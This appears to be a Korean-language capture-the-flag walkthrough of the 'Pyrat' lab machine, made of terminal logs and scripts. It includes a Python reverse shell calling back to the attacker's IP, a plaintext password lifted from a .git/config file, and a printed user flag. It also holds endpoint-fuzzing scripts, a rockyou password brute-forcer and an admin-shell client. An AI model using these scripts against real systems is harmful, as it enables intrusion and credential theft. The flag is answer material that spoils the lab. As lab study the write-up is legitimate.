10.10.247.143

# nmap -Pn -sC -sV -T4 10.10.247.143 -oN nmap.txt --open -sS -> 22, 8000

┌──(root㉿docker-desktop)-[/]
└─# nmap -Pn -sC -sV -T4 10.10.247.143 -oN nmap.txt --open -sS
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-20 13:56 UTC
Stats: 0:00:43 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 13:57 (0:00:39 remaining)
Nmap scan report for 10.10.247.143
Host is up (0.28s latency).
Not shown: 920 closed tcp ports (reset), 78 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 3072 06:8f:ef:d3:a9:61:16:08:10:85:0b:ed:be:bc:53:6f (RSA)
| 256 ae:dc:5f:87:48:a1:5e:82:fd:72:26:6d:1f:14:ff:be (ECDSA)
|_ 256 63:b9:b8:e5:45:7c:27:20:7e:5e:fa:cd:d5:7a:c8:6c (ED25519)
8000/tcp open http-alt SimpleHTTP/0.6 Python/3.11.2
|\_http-open-proxy: Proxy might be redirecting requests
| fingerprint-strings:
| DNSStatusRequestTCP, DNSVersionBindReqTCP, JavaRMI, LANDesk-RC, NotesRPC, Socks4, X11Probe, afp, giop:
| source code string cannot contain null bytes
| FourOhFourRequest, LPDString, SIPOptions:
| invalid syntax (<string>, line 1)
| GetRequest:
| name 'GET' is not defined
| HTTPOptions, RTSPRequest:
| name 'OPTIONS' is not defined
| Help:
|_ name 'HELP' is not defined
|\_http-server-header: SimpleHTTP/0.6 Python/3.11.2
|\_http-title: Site doesn't have a title (text/html; charset=utf-8).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.95%I=7%D=7/20%Time=687CF5A3%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,1,"\n")%r(GetRequest,1A,"name\x20'GET'\x20is\x20not\x20defin
SF:ed\n")%r(X11Probe,2D,"source\x20code\x20string\x20cannot\x20contain\x20
SF:null\x20bytes\n")%r(FourOhFourRequest,22,"invalid\x20syntax\x20\(<strin
SF:g>,\x20line\x201\)\n")%r(Socks4,2D,"source\x20code\x20string\x20cannot\
SF:x20contain\x20null\x20bytes\n")%r(HTTPOptions,1E,"name\x20'OPTIONS'\x20
SF:is\x20not\x20defined\n")%r(RTSPRequest,1E,"name\x20'OPTIONS'\x20is\x20n
SF:ot\x20defined\n")%r(DNSVersionBindReqTCP,2D,"source\x20code\x20string\x
SF:20cannot\x20contain\x20null\x20bytes\n")%r(DNSStatusRequestTCP,2D,"sour
SF:ce\x20code\x20string\x20cannot\x20contain\x20null\x20bytes\n")%r(Help,1
SF:B,"name\x20'HELP'\x20is\x20not\x20defined\n")%r(LPDString,22,"invalid\x
SF:20syntax\x20\(<string>,\x20line\x201\)\n")%r(SIPOptions,22,"invalid\x20
SF:syntax\x20\(<string>,\x20line\x201\)\n")%r(LANDesk-RC,2D,"source\x20cod
SF:e\x20string\x20cannot\x20contain\x20null\x20bytes\n")%r(NotesRPC,2D,"so
SF:urce\x20code\x20string\x20cannot\x20contain\x20null\x20bytes\n")%r(Java
SF:RMI,2D,"source\x20code\x20string\x20cannot\x20contain\x20null\x20bytes\
SF:n")%r(afp,2D,"source\x20code\x20string\x20cannot\x20contain\x20null\x20
SF:bytes\n")%r(giop,2D,"source\x20code\x20string\x20cannot\x20contain\x20n
SF:ull\x20bytes\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 193.67 seconds

# http 10.10.247.143/ -> 페이지 탐색 불가

┌──(root㉿docker-desktop)-[/]
└─# http 10.10.247.143/

http: error: ConnectionError: HTTPConnectionPool(host='10.10.247.143', port=80): Max retries exceeded with url: / (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7ffffd8d6f90>: Failed to establish a new connection: [Errno 111] Connection refused')) while doing a GET request to URL: http://10.10.247.143/

# nc 10.10.247.143 8000

┌──(root㉿docker-desktop)-[/]
└─# nc 10.10.247.143 8000
ls
name 'ls' is not defined

# 명령어 실행 되는 것 확인

(root㉿docker-desktop)-[/]
└─# nc 10.10.247.143 8000
print(1)
name 'ᅦprint' is not defined
^[[D^[[A^[[A
invalid syntax (<string>, line 1)
print(1+1)
2
whoami
name 'whoami' is not defined
id

# 10.10.247.143:8000에서 Python 인터프리터가 실행 중

ls, whoami 등은 쉘 명령어라서 작동하지 않음
print(1+1) → 2가 나온 것으로 Python 환경임을 확인

# nc -lvnp 4444 -> 공격자인 내 머신에서 대기하기

(root㉿docker-desktop)-[/]
└─# nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.8.136.212] from (UNKNOWN) [10.10.247.143] 40290
bash: /root/.bashrc: Permission denied
www-data@ip-10-10-234-59:~$ ls  
ㅣls

Command 'ㅣls' not found, did you mean:

command 'hls' from deb hfsutils (3.2.6-14)
command 'ils' from deb sleuthkit (4.6.7-1build1)
command 'bls' from deb bacula-sd (9.4.2-2ubuntu5)
command 'ols' from deb speech-tools (1:2.5.0-8build1)
command 'als' from deb atool (0.39.0-10)
command 'ls' from deb coreutils (8.30-3ubuntu2)
command 'jls' from deb sleuthkit (4.6.7-1build1)
command 'fls' from deb sleuthkit (4.6.7-1build1)

Try: apt install <deb name>

www-data@ip-10-10-234-59:~$

# 공격대상 컴퓨터 (파이썬 인터프리터) https://www.revshells.com/ 검색해서 실행

```bash
import socket
import subprocess
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.8.136.212", 4445))

os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

subprocess.call(["/bin/bash", "-i"])
```

# www-data 권한으로 시작

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
whoami
www-data

# ls 는 안 되는데 path 지정하면 잘 됨

ls -al
ls: cannot open directory '.': Permission denied
$ ls -al /
ls -al /
total 2035784
drwxr-xr-x 18 root root 4096 Jul 21 14:39 .
drwxr-xr-x 18 root root 4096 Jul 21 14:39 ..
lrwxrwxrwx 1 root root 7 Feb 23 2022 bin -> usr/bin
drwxr-xr-x 4 root root 4096 Apr 27 06:25 boot
drwxr-xr-x 17 root root 4000 Jul 21 14:39 dev
drwxr-xr-x 106 root root 4096 Jul 21 14:39 etc
drwxr-xr-x 4 root root 4096 Jul 21 14:39 home
lrwxrwxrwx 1 root root 7 Feb 23 2022 lib -> usr/lib
lrwxrwxrwx 1 root root 9 Feb 23 2022 lib32 -> usr/lib32
lrwxrwxrwx 1 root root 9 Feb 23 2022 lib64 -> usr/lib64
lrwxrwxrwx 1 root root 10 Feb 23 2022 libx32 -> usr/libx32
drwx------ 2 root root 16384 Jun 2 2023 lost+found
drwxr-xr-x 2 root root 4096 Jun 2 2023 media
drwxr-xr-x 2 root root 4096 Feb 23 2022 mnt
drwxr-xr-x 3 root root 4096 Jun 21 2023 opt
dr-xr-xr-x 174 root root 0 Jul 21 14:39 proc
drwxrwx--- 7 root root 4096 Apr 15 2024 root
drwxr-xr-x 26 root root 780 Jul 21 14:39 run
lrwxrwxrwx 1 root root 8 Feb 23 2022 sbin -> usr/sbin
drwxr-xr-x 2 root root 4096 Feb 23 2022 srv
-rw------- 1 root root 2084569088 Jun 2 2023 swap.img
dr-xr-xr-x 13 root root 0 Jul 21 14:39 sys
drwxrwxrwt 12 root root 4096 Jul 21 14:40 tmp
drwxr-xr-x 14 root root 4096 Feb 23 2022 usr
drwxr-xr-x 12 root root 4096 Dec 22 2023 var

# think 발견

ls -al /home
total 16
drwxr-xr-x 4 root root 4096 Jul 21 14:39 .
drwxr-xr-x 18 root root 4096 Jul 21 14:39 ..
drwxr-x--- 5 think think 4096 Jun 21 2023 think
drwxr-xr-x 3 ubuntu ubuntu 4096 Jul 21 14:39 ubuntu

$ ls -al /opt
ls -al /opt
total 12
drwxr-xr-x 3 root root 4096 Jun 21 2023 .
drwxr-xr-x 18 root root 4096 Jul 21 14:39 ..
drwxrwxr-x 3 think think 4096 Jun 21 2023 dev

ls -al /opt/dev/.git/
ls -al /opt/dev/.git/
total 52
drwxrwxr-x 8 think think 4096 Jun 21 2023 .
drwxrwxr-x 3 think think 4096 Jun 21 2023 ..
drwxrwxr-x 2 think think 4096 Jun 21 2023 branches
-rw-rw-r-- 1 think think 21 Jun 21 2023 COMMIT_EDITMSG
-rw-rw-r-- 1 think think 296 Jun 21 2023 config
-rw-rw-r-- 1 think think 73 Jun 21 2023 description
-rw-rw-r-- 1 think think 23 Jun 21 2023 HEAD
drwxrwxr-x 2 think think 4096 Jun 21 2023 hooks
-rw-rw-r-- 1 think think 145 Jun 21 2023 index
drwxrwxr-x 2 think think 4096 Jun 21 2023 info
drwxrwxr-x 3 think think 4096 Jun 21 2023 logs
drwxrwxr-x 7 think think 4096 Jun 21 2023 objects
drwxrwxr-x 4 think think 4096 Jun 21 2023 refs

# 단서 발견

cat /opt/dev/.git/config
cat /opt/dev/.git/config
[core]
repositoryformatversion = 0
filemode = true
bare = false
logallrefupdates = true
[user]
name = Jose Mario
email = josemlwdf@github.com

[credential]
helper = cache --timeout=3600

[credential "https://github.com"]
username = think
password = _TH1NKINGPirate$_

# id = think

# password = _TH1NKINGPirate$_

# 쉘 전환

su - think 의미
su는 **"switch user"**의 약자로, 현재 사용자에서 다른 사용자 계정으로 전환하는 명령어입니다.

think는 전환하려는 사용자 이름(username) 입니다.

- (하이픈)은 옵션으로, 로그인 셸(login shell) 환경으로 전환하겠다는 뜻입니다.

# 로그인 쉘 전환 완료

t open directory '/home/think': Permission denied
$ su - think
su - think
Password: _TH1NKINGPirate$_

think@ip-10-10-249-130:~$ ls
ls
snap user.txt
think@ip-10-10-249-130:~$

think@ip-10-10-249-130:~$ cat user.txt
cat user.txt
996bdb1f619a68361417cabca5454705
think@ip-10-10-249-130:~$

# 상당히 권한이 높아 보임

think@ip-10-10-249-130:~$ id
id
uid=1000(think) gid=1000(think) groups=1000(think)
think@ip-10-10-249-130:~$

# ssh think@10.10.247.143

# password = _TH1NKINGPirate$_

# 사용자 메일함 /var/mail/think 확인

cat /var/mail/think
From root@pyrat Thu Jun 15 09:08:55 2023
Return-Path: <root@pyrat>
X-Original-To: think@pyrat
Delivered-To: think@pyrat
Received: by pyrat.localdomain (Postfix, from userid 0)
id 2E4312141; Thu, 15 Jun 2023 09:08:55 +0000 (UTC)
Subject: Hello
To: <think@pyrat>
X-Mailer: mail (GNU Mailutils 3.7)
Message-Id: <20230615090855.2E4312141@pyrat.localdomain>
Date: Thu, 15 Jun 2023 09:08:55 +0000 (UTC)
From: Dbile Admen <root@pyrat>

Hello jose, I wanted to tell you that i have installed the RAT you posted on your GitHub page, i'll test it tonight so don't be scared if you see it running. Regards, Dbile Admen
think@ip-10-10-249-130:~$

# ps aux

think@ip-10-10-247-143:/$ ps aux
USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND
root 1 0.3 0.6 103836 12636 ? Ss 13:52 0:02 /sbin/init auto automatic-ubiquity noprompt
root 2 0.0 0.0 0 0 ? S 13:52 0:00 [kthreadd]
root 3 0.0 0.0 0 0 ? I< 13:52 0:00 [rcu_gp]
root 4 0.0 0.0 0 0 ? I< 13:52 0:00 [rcu_par_gp]
root 5 0.0 0.0 0 0 ? I< 13:52 0:00 [slub_flushwq]
root 6 0.0 0.0 0 0 ? I< 13:52 0:00 [netns]
root 7 0.0 0.0 0 0 ? I 13:52 0:00 [kworker/0:0-events]
root 8 0.0 0.0 0 0 ? I< 13:52 0:00 [kworker/0:0H-events_highpri]
root 9 0.0 0.0 0 0 ? I 13:52 0:00 [kworker/u4:0-events_unbound]
root 10 0.0 0.0 0 0 ? I< 13:52 0:00 [mm_percpu_wq]
root 11 0.0 0.0 0 0 ? S 13:52 0:00 [rcu_tasks_rude_]
root 12 0.0 0.0 0 0 ? S 13:52 0:00 [rcu_tasks_trace]
root 13 0.0 0.0 0 0 ? S 13:52 0:00 [ksoftirqd/0]
root 14 0.0 0.0 0 0 ? I 13:52 0:00 [rcu_sched]
root 15 0.0 0.0 0 0 ? S 13:52 0:00 [migration/0]
root 16 0.0 0.0 0 0 ? S 13:52 0:00 [idle_inject/0]
root 18 0.0 0.0 0 0 ? S 13:52 0:00 [cpuhp/0]
root 19 0.0 0.0 0 0 ? S 13:52 0:00 [cpuhp/1]
root 20 0.0 0.0 0 0 ? S 13:52 0:00 [idle_inject/1]
root 21 0.0 0.0 0 0 ? S 13:52 0:00 [migration/1]
root 22 0.0 0.0 0 0 ? S 13:52 0:00 [ksoftirqd/1]
root 23 0.0 0.0 0 0 ? I 13:52 0:00 [kworker/1:0-events]
root 24 0.0 0.0 0 0 ? I< 13:52 0:00 [kworker/1:0H-events_highpri]
root 25 0.0 0.0 0 0 ? S 13:52 0:00 [kdevtmpfs]
root 26 0.0 0.0 0 0 ? I< 13:52 0:00 [inet_frag_wq]
root 27 0.0 0.0 0 0 ? S 13:52 0:00 [kauditd]
root 29 0.0 0.0 0 0 ? S 13:52 0:00 [khungtaskd]
root 30 0.0 0.0 0 0 ? S 13:52 0:00 [oom_reaper]
root 31 0.0 0.0 0 0 ? I< 13:52 0:00 [writeback]
root 32 0.0 0.0 0 0 ? S 13:52 0:00 [kcompactd0]
root 33 0.0 0.0 0 0 ? SN 13:52 0:00 [ksmd]
root 34 0.0 0.0 0 0 ? SN 13:52 0:00 [khugepaged]
root 80 0.0 0.0 0 0 ? I< 13:52 0:00 [kintegrityd]
root 81 0.0 0.0 0 0 ? I< 13:52 0:00 [kblockd]
root 82 0.0 0.0 0 0 ? I< 13:52 0:00 [blkcg_punt_bio]
root 83 0.0 0.0 0 0 ? I< 13:52 0:00 [tpm_dev_wq]
root 84 0.0 0.0 0 0 ? I< 13:52 0:00 [ata_sff]
root 85 0.0 0.0 0 0 ? I< 13:52 0:00 [md]
root 86 0.0 0.0 0 0 ? I< 13:52 0:00 [edac-poller]
root 87 0.0 0.0 0 0 ? I< 13:52 0:00 [devfreq_wq]
root 88 0.0 0.0 0 0 ? S 13:52 0:00 [watchdogd]
root 90 0.0 0.0 0 0 ? I< 13:52 0:00 [kworker/0:1H-kblockd]
root 92 0.0 0.0 0 0 ? S 13:52 0:00 [kswapd0]
root 93 0.0 0.0 0 0 ? S 13:52 0:00 [ecryptfs-kthrea]
root 95 0.0 0.0 0 0 ? I< 13:52 0:00 [kthrotld]
root 96 0.0 0.0 0 0 ? I< 13:52 0:00 [acpi_thermal_pm]
root 98 0.0 0.0 0 0 ? I< 13:52 0:00 [vfio-irqfd-clea]
root 99 0.0 0.0 0 0 ? I< 13:52 0:00 [mld]
root 100 0.0 0.0 0 0 ? I< 13:52 0:00 [ipv6_addrconf]
root 110 0.0 0.0 0 0 ? I< 13:52 0:00 [kstrp]
root 113 0.0 0.0 0 0 ? I< 13:52 0:00 [zswap-shrink]
root 114 0.0 0.0 0 0 ? I< 13:52 0:00 [kworker/u5:0]
root 119 0.0 0.0 0 0 ? I< 13:52 0:00 [charger_manager]
root 158 0.0 0.0 0 0 ? I< 13:52 0:00 [kworker/1:1H-kblockd]
root 159 0.0 0.0 0 0 ? I< 13:52 0:00 [nvme-wq]
root 160 0.0 0.0 0 0 ? I< 13:52 0:00 [cryptd]
root 171 0.0 0.0 0 0 ? I< 13:52 0:00 [ena]
root 178 0.0 0.0 0 0 ? I< 13:52 0:00 [nvme-reset-wq]
root 180 0.0 0.0 0 0 ? I< 13:52 0:00 [nvme-delete-wq]
root 196 0.0 0.0 0 0 ? I 13:52 0:00 [kworker/u4:3-events_unbound]
root 224 0.0 0.0 0 0 ? I< 13:52 0:00 [kdmflush]
root 225 0.0 0.0 0 0 ? I< 13:52 0:00 [kdmflush]
root 262 0.0 0.0 0 0 ? I< 13:52 0:00 [raid5wq]
root 324 0.0 0.0 0 0 ? S 13:52 0:00 [jbd2/dm-0-8]
root 325 0.0 0.0 0 0 ? I< 13:52 0:00 [ext4-rsv-conver]
root 402 0.0 0.4 32468 8932 ? S<s 13:52 0:00 /lib/systemd/systemd-journald
root 429 0.0 0.0 0 0 ? I 13:52 0:00 [kworker/0:3-events]
root 435 0.0 0.0 0 0 ? I 13:52 0:00 [kworker/1:3-events]
root 440 0.0 0.3 23080 6020 ? Ss 13:52 0:00 /lib/systemd/systemd-udevd
root 529 0.0 0.0 0 0 ? I< 13:52 0:00 [kaluad]
root 530 0.0 0.0 0 0 ? I< 13:52 0:00 [kmpath_rdacd]
root 531 0.0 0.0 0 0 ? I< 13:52 0:00 [kmpathd]
root 532 0.0 0.0 0 0 ? I< 13:52 0:00 [kmpath_handlerd]
root 533 0.0 0.9 280208 18004 ? SLsl 13:52 0:00 /sbin/multipathd -d -s
root 546 0.0 0.0 0 0 ? S 13:52 0:00 [jbd2/nvme0n1p2-]
root 547 0.0 0.0 0 0 ? I< 13:52 0:00 [ext4-rsv-conver]
systemd+ 560 0.0 0.3 90896 6120 ? Ssl 13:52 0:00 /lib/systemd/systemd-timesyncd
systemd+ 611 0.0 0.3 27416 7504 ? Ss 13:52 0:00 /lib/systemd/systemd-networkd
systemd+ 613 0.0 0.6 25492 13024 ? Ss 13:52 0:00 /lib/systemd/systemd-resolved
root 667 0.0 0.3 235580 7260 ? Ssl 13:52 0:00 /usr/lib/accountsservice/accounts-daemon
root 668 0.0 0.8 1758084 17572 ? Ssl 13:52 0:00 /usr/bin/amazon-ssm-agent
message+ 670 0.0 0.2 7576 4688 ? Ss 13:52 0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
root 680 0.0 0.1 81836 3720 ? Ssl 13:52 0:00 /usr/sbin/irqbalance --foreground
root 681 0.0 0.9 29676 18584 ? Ss 13:52 0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root 685 0.0 0.1 6824 2924 ? Ss 13:52 0:00 /usr/sbin/cron -f
root 686 0.0 0.3 232740 6928 ? Ssl 13:52 0:00 /usr/lib/policykit-1/polkitd --no-debug
syslog 694 0.0 0.2 224500 4692 ? Ssl 13:52 0:00 /usr/sbin/rsyslogd -n -iNONE
root 696 0.0 0.1 8368 3396 ? S 13:52 0:00 /usr/sbin/CRON -f
root 702 0.0 0.3 17316 7876 ? Ss 13:52 0:00 /lib/systemd/systemd-logind
root 707 0.0 0.6 393268 12024 ? Ssl 13:52 0:00 /usr/lib/udisks2/udisksd
daemon 710 0.0 0.1 3804 2240 ? Ss 13:52 0:00 /usr/sbin/atd -f
root 713 0.0 0.0 2616 592 ? Ss 13:52 0:00 /bin/sh -c python3 /root/pyrat.py 2>/dev/null
root 714 0.0 0.7 21872 14508 ? S 13:52 0:00 python3 /root/pyrat.py
root 737 0.0 0.5 241380 11308 ? Ssl 13:52 0:00 /usr/sbin/ModemManager

# 위에서 언급한 의심 파일 발견

root 747 0.0 0.6 169444 12468 ? Sl 13:52 0:00 python3 /root/pyrat.py
root 754 0.0 0.3 12196 6788 ? Ss 13:52 0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
root 761 0.0 0.1 5608 2228 ttyS0 Ss+ 13:52 0:00 /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220
root 763 0.0 1.0 107948 20736 ? Ssl 13:52 0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root 771 0.0 0.0 5836 1760 tty1 Ss+ 13:52 0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root 1402 0.0 0.2 38076 4540 ? Ss 13:52 0:00 /usr/lib/postfix/sbin/master -w
postfix 1403 0.0 0.3 38344 6060 ? S 13:52 0:00 pickup -l -t unix -u -c
postfix 1404 0.0 0.3 38540 6176 ? S 13:52 0:00 qmgr -l -t unix -u
root 1649 0.0 0.4 13948 9120 ? Ss 13:56 0:00 sshd: think [priv]
think 1656 0.0 0.4 19064 9680 ? Ss 13:56 0:00 /lib/systemd/systemd --user
think 1658 0.0 0.2 104924 4400 ? S 13:56 0:00 (sd-pam)
think 1785 0.0 0.3 14420 6512 ? R 13:56 0:00 sshd: think@pts/0
think 1791 0.0 0.2 8416 5236 pts/0 Ss 13:56 0:00 -bash
root 1810 0.0 0.0 0 0 ? I 13:58 0:00 [kworker/0:1-events]
root 1812 0.0 0.0 0 0 ? I 13:58 0:00 [kworker/u4:1-events_unbound]
root 1816 0.0 0.0 0 0 ? I 13:59 0:00 [kworker/u4:2-events_unbound]
postfix 1846 0.0 0.3 38448 6116 ? S 14:01 0:00 cleanup -z -t unix -u -c
postfix 1847 0.0 0.3 38352 6208 ? S 14:01 0:00 trivial-rewrite -n rewrite -t unix -u -c
postfix 1848 0.0 0.2 38148 5892 ? S 14:01 0:00 local -t unix
postfix 1849 0.0 0.3 38372 6136 ? S 14:01 0:00 bounce -z -t unix -u -c
think 1877 0.0 0.1 8896 3236 pts/0 R+ 14:03 0:00 ps aux

# cd /opt/dev -> .git 파일 확인

# git log

think@ip-10-10-247-143:/opt/dev$ git staus
git: 'staus' is not a git command. See 'git --help'.

The most similar command is
status
think@ip-10-10-247-143:/opt/dev$ git checkout -- pyrat.py.old
think@ip-10-10-247-143:/opt/dev$ git log
commit 0a3c36d66369fd4b07ddca72e5379461a63470bf (HEAD -> master)
Author: Jose Mario <josemlwdf@github.com>
Date: Wed Jun 21 09:32:14 2023 +0000

    Added shell endpoint

# git show 0a3c36d66369fd4b07ddca72e5379461a63470bf

+...............................................

- +def switch_case(client_socket, data):
- if data == 'some_endpoint':
-        get_this_enpoint(client_socket)
- else:
-        # Check socket is admin and downgrade if is not aprooved
-        uid = os.getuid()
-        if (uid == 0):
-            change_uid()
-
-        if data == 'shell':
-            shell(client_socket)
-        else:
-            exec_python(client_socket, data)
- +def shell(client_socket):
- try:
-        import pty
-        os.dup2(client_socket.fileno(), 0)
-        os.dup2(client_socket.fileno(), 1)
-        os.dup2(client_socket.fileno(), 2)
-        pty.spawn("/bin/sh")
- except Exception as e:
-        send_data(client_socket, e
- +...............................................

# some_endpoint 라고 하네? 그럼 다시 공격자로 돌아와서 Py 스크립트 셋팅

```py
import socket  # 소켓 통신을 위한 표준 라이브러리

def fuzz_endpoints(ip, port, endpoints):
    # 주어진 IP와 포트에 대해 여러 endpoint 문자열을 전송하여 반응을 확인하는 함수
    for endpoint in endpoints:
        try:
            # 🔹 소켓 생성
            # socket.AF_INET: IPv4 주소 체계 사용 (예: 192.168.0.1)
            # socket.SOCK_STREAM: TCP 프로토콜 사용 (신뢰성 있는 연결 지향 통신)
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            # 🔹 서버에 연결 시도
            # connect()는 지정한 IP와 포트 번호로 TCP 연결을 시도
            client_socket.connect((ip, port))

            print(f"Testing: {endpoint}")  # 현재 테스트 중인 endpoint 출력

            # 🔹 엔드포인트 문자열 전송
            # 문자열을 바이트로 인코딩하고 줄바꿈 문자 추가하여 서버에 전송
            client_socket.sendall(endpoint.encode() + b'\n')

            # 🔹 서버 응답 수신
            # 최대 1024바이트 수신; recv는 블로킹 방식으로 응답 대기
            response = client_socket.recv(1024)

            # 🔹 응답 출력
            print(f"Response from {endpoint}: {response.decode()}\n")

            # 🔹 연결 종료
            client_socket.close()
        except Exception as e:
            # 에러 발생 시 해당 endpoint와 함께 에러 메시지 출력
            print(f"Error with {endpoint}: {e}")

# 🔹 테스트할 잠재적인 엔드포인트 리스트 정의
endpoint_list = [
    "some_endpoint",  # 정상적인 엔드포인트로 예상됨
    "shell",          # 셸 접근 시도
    "admin",          # 관리자 권한 요청 시도
    "backup",         # 백업 관련 기능 탐색
    "reset",          # 초기화 기능 테스트
    "login",          # 로그인 엔드포인트
    "help",           # 도움말 엔드포인트
    "root",           # 루트 접근 시도
    "register",       # 회원가입 시도
    "old"             # 이전 버전이나 숨겨진 기능 탐색
]

# 🔹 대상 서버 IP 및 포트 설정 (실제 환경에 맞게 수정 필요)
target_ip = "10.10.247.143"
target_port = 8000

# 🔹 fuzzing 실행
fuzz_endpoints(target_ip, target_port, endpoint_list)

```

Testing: some_endpoint
Response from some_endpoint: name 'some_endpoint' is not defined

Testing: shell
Response from shell: $

Testing: admin
Response from admin: Password:

Testing: backup
Response from backup: name 'backup' is not defined

Testing: reset
Response from reset: name 'reset' is not defined

Testing: login
Response from login: name 'login' is not defined

Testing: help
Response from help:

Testing: root
Response from root: name 'root' is not defined

Testing: register
Response from register: name 'register' is not defined

Testing: old
Response from old: name 'old' is not defined

```py
import socket  # 소켓 통신을 위한 표준 라이브러리
import os

def fuzz_endpoints(ip, port, endpoints):
    for endpoint in endpoints:
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((ip, port))

            print(f"Testing: {endpoint}")
            client_socket.sendall(endpoint.encode() + b'\n')
            response = client_socket.recv(1024)
            print(f"Response from {endpoint}: {response.decode()}\n")

            client_socket.close()
        except Exception as e:
            print(f"Error with {endpoint}: {e}")

# 🔹 네임리스트 파일 경로 (환경에 맞게 수정)
name_file_path = "/usr/share/seclists/Discovery/Web-Content/raft-large-words.txt"

# 🔹 파일에서 엔드포인트 리스트 읽기
# 각 줄에서 개행 문자 제거하고 리스트로 저장
with open(name_file_path, "r", encoding="utf-8") as f:
    endpoint_list = [line.strip() for line in f if line.strip()]

# 대상 서버 정보
target_ip = "10.10.247.143"
target_port = 8000

# fuzzing 실행
fuzz_endpoints(target_ip, target_port, endpoint_list)
```

┌──(root㉿docker-desktop)-[~]
└─# python3 fuzz_python.py
Testing: .php
Response from .php: invalid syntax (<string>, line 1)

Testing: cgi-bin
Response from cgi-bin: name 'cgi' is not defined

Testing: images
Response from images: name 'images' is not defined

Testing: admin
Response from admin: Password:

Testing: includes
Response from includes: name 'includes' is not defined

Testing: search
Response from search: name 'search' is not defined

Testing: .html
Response from .html: invalid syntax (<string>, line 1)

Testing: cache
Response from cache: name 'cache' is not defined

Testing: login

# admin, shell 반응함 -> shell $ 로 나오는데 권한이 없는 사용자는 이렇게 나옴 따라서 무시하기 -> admin 만 집중공략

# pyton scrpting

```py
import socket

# Configuration
target_ip = "10.10.247.143"  # Target IP
target_port = 8000          # Target port
password_wordlist = "/usr/share/wordlists/rockyou.txt"  # Path to your password wordlist file

def connect_and_send_password(password):
    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((target_ip, target_port))
        client_socket.sendall(b'admin\n')


        response = client_socket.recv(1024).decode()
        print(f"Server response after sending 'admin': {response}")

        if "Password:" in response:
            print(f"Trying password: {password}")
            client_socket.sendall(password.encode() + b"\n")

            response = client_socket.recv(1024).decode()

            if response:
                print(f"Server response for password '{password}': {response}")
                return True
            else:
                print(f"Password '{password}' is incorrect or no response.")

        return False

    except Exception as e:
        print(f"Error: {e}")
        return False

    finally:
        client_socket.close()

def fuzz_passwords():
    with open(password_wordlist, "r", encoding="latin-1") as file:
        passwords = file.readlines()

    for password in passwords:
        password = password.strip()  # Remove any newline characters

        if connect_and_send_password(password):
            print(f"Correct password found: {password}")
            break
        else:
            print(f"Password {password} was incorrect. Reconnecting...")

if __name__ == "__main__":
    fuzz_passwords()

```

# 에러 발생 ! -> rockyou.txt 는 일반적으로 latin-1 인코딩 해야함 -> 현재 utf-8 이므로 latin-1 로 수정하기

Traceback (most recent call last):
File "/root/password.py", line 53, in <module>
fuzz_passwords()

```^^
File "/root/password.py", line 41, in fuzz_passwords
passwords = file.readlines()
File "<frozen codecs>", line 325, in decode
UnicodeDecodeError: 'utf-8' codec can't decode byte 0xf1 in position 933: invalid continuation byte
```

# 수정 후 비밀번호 찾기 완료

┌──(root㉿docker-desktop)-[~]
└─# python3 password.py
Server response after sending 'admin': Password:

Trying password: 123456
Server response for password '123456': Password:

Correct password found: 123456

```py
import socket

# Configuration
target_ip = "10.10.247.143"  # Target IP
target_port = 8000          # Target port
password = "123456"         # Known password

def connect_and_interact():
    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((target_ip, target_port))

        # Send 'admin' to the server
        client_socket.sendall(b'admin\n')

        # Receive the response from the server after sending 'admin'
        response = client_socket.recv(1024).decode()
        print(f"Server response after sending 'admin': {response}")

        # Wait for the server to send "Password:"
        if "Password:" in response:
            print(f"Sending password: {password}")
            client_socket.sendall(password.encode() + b"\n")

            response = client_socket.recv(1024).decode()

            if "Welcome Admin!!!" in response:
                print(f"Server response for password '{password}': {response}")

                # Send 'shell' command after receiving the welcome message
                client_socket.sendall(b'shell\n')
                print("Sent 'shell' command. Waiting for shell response...")
                response = client_socket.recv(1024).decode()

                if response:
                    print(f"Shell response: {response}")
                    interact_with_shell(client_socket)
                else:
                    print("No response after sending 'shell'.")
            else:
                print(f"Unexpected response after password: {response}")

        else:
            print("Did not receive the 'Password:' prompt.")

    except Exception as e:
        print(f"Error during connection or communication: {e}")

    finally:
        if client_socket:
            client_socket.close()

def interact_with_shell(client_socket):
    try:
        while True:
            command = input("Enter command to execute: ")
            client_socket.sendall(command.encode() + b"\n")
            response = client_socket.recv(4096).decode()
            print(f"Response: {response}")

    except Exception as e:
        print(f"Error during interaction: {e}")

if __name__ == "__main__":
    connect_and_interact()
```
